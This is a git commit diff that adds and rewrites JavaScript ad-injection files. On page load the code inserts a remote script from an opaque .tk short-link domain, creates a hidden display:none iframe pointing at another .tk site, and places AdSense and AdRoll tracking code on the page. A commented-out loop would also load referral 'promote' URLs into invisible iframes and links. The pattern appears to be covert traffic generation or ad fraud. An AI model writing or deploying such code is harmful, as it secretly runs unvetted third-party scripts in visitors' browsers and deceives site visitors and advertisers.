3f60cd6bc54f5234ad1c002fc5ead406bfc6a34c
guochijun@dianmi365.com <guochijun@dianmi365.com>
2017-08-30 15:19:15 +0800

    ad3

---
+++ 2ad.js
@@ -0,0 +1,57 @@
+(function () {
+//基础
+var b = document.createElement("script");
+b.src = "http://www.7k77.tk/eicXsB?1503385493";
+(document.getElementsByTagName("HEAD")[0] || document.body).appendChild(b)
+//插广告
+var adList=[
+    'http://www.hupress.tk/',
+    
+    'http://ptp.skillerzforum.com/promote.php?id=22979'
+]
+/* <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+<!-- 特殊t -->
+<ins class="adsbygoogle"
+     style="display:inline-block;width:320px;height:100px"
+     data-ad-client="ca-pub-3568322529043220"
+     data-ad-slot="9488597897"></ins>
+<script>
+(adsbygoogle = window.adsbygoogle || []).push({});
+</script> */
+// 'http://adpays.net/v.php?user=4297',
+/* for(var i=0,len=adList.length;i<len;i++){
+    //iframe 
+    var elemIF = document.createElement("iframe");
+    elemIF.src = adList[i];
+    elemIF.sandbox = "allow-scripts allow-same-origin allow-forms"
+    elemIF.style.display = "none";
+    document.body.appendChild(elemIF)
+    //a标签
+    var elemA=document.createElement("a");
+    elemA.href=adList[i];
+    elemA.innerText=adList[i]
+    elemA.style.display = "none";
+    document.body.appendChild(elemA)
+} */
+var elemIF = document.createElement("iframe");
+elemIF.src = 'http://www.hupress.tk/';
+// elemIF.sandbox = "allow-scripts allow-same-origin allow-forms"
+elemIF.style.display = "none";
+document.body.appendChild(elemIF)
+var elemSC = document.createElement("script");
+elemSC.async;
+elemSC.src = "//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"
+document.body.appendChild(elemSC)
+var elemINC = document.createElement("ins");
+elemINC.className = "adsbygoogle";
+elemINC.style = "display:inline-block;width:320px;height:100px";
+elemINC.setAttribute("data-ad-client","ca-pub-3568322529043220")
+elemINC.setAttribute("data-ad-slot","9488597897")
+document.body.appendChild(elemINC)
+var elemSCs = document.createElement("script");
+elemSCs.innerText='(adsbygoogle = window.adsbygoogle || []).push({});';
+document.body.appendChild(elemSCs)
+})()
+
+
+
--- ad.js
+++ ad.js
@@ -1,57 +1,16 @@
 (function () {
-//基础
-var b = document.createElement("script");
-b.src = "http://www.7k77.tk/eicXsB?1503385493";
-(document.getElementsByTagName("HEAD")[0] || document.body).appendChild(b)
-//插广告
-var adList=[
-    'http://www.hupress.tk/',
-    
-    'http://ptp.skillerzforum.com/promote.php?id=22979'
-]
-/* <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
-<!-- 特殊t -->
-<ins class="adsbygoogle"
-     style="display:inline-block;width:320px;height:100px"
-     data-ad-client="ca-pub-3568322529043220"
-     data-ad-slot="9488597897"></ins>
-<script>
-(adsbygoogle = window.adsbygoogle || []).push({});
-</script> */
-// 'http://adpays.net/v.php?user=4297',
-/* for(var i=0,len=adList.length;i<len;i++){
-    //iframe 
-    var elemIF = document.createElement("iframe");
-    elemIF.src = adList[i];
-    elemIF.sandbox = "allow-scripts allow-same-origin allow-forms"
-    elemIF.style.display = "none";
-    document.body.appendChild(elemIF)
-    //a标签
-    var elemA=document.createElement("a");
-    elemA.href=adList[i];
-    elemA.innerText=adList[i]
-    elemA.style.display = "none";
-    document.body.appendChild(elemA)
-} */
-var elemIF = document.createElement("iframe");
-elemIF.src = 'http://www.hupress.tk/';
-// elemIF.sandbox = "allow-scripts allow-same-origin allow-forms"
-elemIF.style.display = "none";
-document.body.appendChild(elemIF)
-var elemSC = document.createElement("script");
-elemSC.async;
-elemSC.src = "//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"
-document.body.appendChild(elemSC)
-var elemINC = document.createElement("ins");
-elemINC.className = "adsbygoogle";
-elemINC.style = "display:inline-block;width:320px;height:100px";
-elemINC.setAttribute("data-ad-client","ca-pub-3568322529043220")
-elemINC.setAttribute("data-ad-slot","9488597897")
-document.body.appendChild(elemINC)
-var elemSCs = document.createElement("script");
-elemSCs.innerText='(adsbygoogle = window.adsbygoogle || []).push({});';
-document.body.appendChild(elemSCs)
+    //基础
+    var b = document.createElement("script");
+    b.src = "http://www.7k77.tk/eicXsB?1503385493";
+    (document.getElementsByTagName("HEAD")[0] || document.body).appendChild(b)
+    var elemDIV1 = document.createElement("div");
+    elemDIV1.innerHTML='<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script><!-- 特殊t --><ins class="adsbygoogle"  style="display:inline-block;width:320px;height:100px"  data-ad-client="ca-pub-3568322529043220" data-ad-slot="9488597897"></ins><script>(adsbygoogle = window.adsbygoogle || []).push({});</script>'
+    document.body.appendChild(elemDIV1)
+    var elemDIV2 = document.createElement("div");
+    elemDIV2.innerHTML='<script type="text/javascript">adroll_adv_id = "L7WXEIIXVFHTPO5OCE4XAQ";adroll_pix_id = "PITPGXN7PJHEDEFA4N5AHM";/* OPTIONAL: provide email to improve user identification *//* adroll_email = "username@example.com"; */    (function () {var _onload = function(){if (document.readyState && !/loaded|complete/.test(document.readyState)){setTimeout(_onload, 10);return}if (!window.__adroll_loaded){__adroll_loaded=true;setTimeout(_onload, 50);return}var scr = document.createElement("script");var host = (("https:" == document.location.protocol) ? "https://s.adroll.com" : "http://a.adroll.com");scr.setAttribute("async", "true");scr.type = "text/javascript";scr.src = host + "/j/roundtrip.js";((document.getElementsByTagName("head") || [null])[0] ||document.getElementsByTagName("script")[0].parentNode).appendChild(scr);};if (window.addEventListener) {window.addEventListener("load", _onload, false);}else {window.attachEvent("onload", _onload)}}());</script>'
+    document.body.appendChild(elemDIV2)
 })()
-
-
-
+    
+    
+    
+  
